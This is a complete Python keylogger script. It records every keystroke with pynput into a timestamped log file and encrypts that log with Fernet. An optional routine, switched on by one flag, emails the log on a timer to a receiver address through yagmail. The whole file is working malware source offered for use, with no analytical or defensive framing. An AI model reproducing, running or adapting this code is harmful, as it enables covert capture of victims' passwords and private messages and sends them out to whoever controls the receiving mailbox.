import os
import sys
import logging
import threading
import smtplib
import yagmail
from pynput.keyboard import Listener
from datetime import datetime
from cryptography.fernet import Fernet

LOG_FILE = "keylog.txt"  # File to store keystrokes
EMAIL_SEND = False  # Set True to enable email logging
EMAIL_INTERVAL = 60  # Send logs every X seconds (if email is enabled)
EMAIL_ADDRESS = "your-email@gmail.com"  # Sender email
EMAIL_PASSWORD = "your-password"  # App password (use Gmail App Passwords)
EMAIL_RECEIVER = "receiver-email@gmail.com"  # Receiver email
ENCRYPTION_KEY = Fernet.generate_key()  # Generate encryption key
fernet = Fernet(ENCRYPTION_KEY)  # Encryption instance

logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s - %(message)s")


def encrypt_log():
    try:
        with open(LOG_FILE, "rb") as f:
            data = f.read()
        encrypted_data = fernet.encrypt(data)
        with open(LOG_FILE, "wb") as f:
            f.write(encrypted_data)
    except Exception as e:
        print(f"Encryption Error: {e}")


def decrypt_log():
    try:
        with open(LOG_FILE, "rb") as f:
            data = f.read()
        decrypted_data = fernet.decrypt(data).decode()
        return decrypted_data
    except Exception as e:
        print(f"Decryption Error: {e}")
        return ""


def on_press(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f" {key} ")


def send_email():
    if not EMAIL_SEND:
        return

    while True:
        try:
            encrypt_log()
            with open(LOG_FILE, "rb") as f:
                encrypted_content = f.read()
            yag = yagmail.SMTP(EMAIL_ADDRESS, EMAIL_PASSWORD)
            yag.send(to=EMAIL_RECEIVER, subject="Keylog Report", contents="Attached keylog file.", attachments=LOG_FILE)
            print(f"[*] Email sent to {EMAIL_RECEIVER}")
        except smtplib.SMTPException as e:
            print(f"Email Error: {e}")
        finally:
            threading.Timer(EMAIL_INTERVAL, send_email).start()
            break  # Prevent infinite loops


def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    print("[*] Keylogger Started...")

    if EMAIL_SEND:
        email_thread = threading.Thread(target=send_email)
        email_thread.start()

    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()
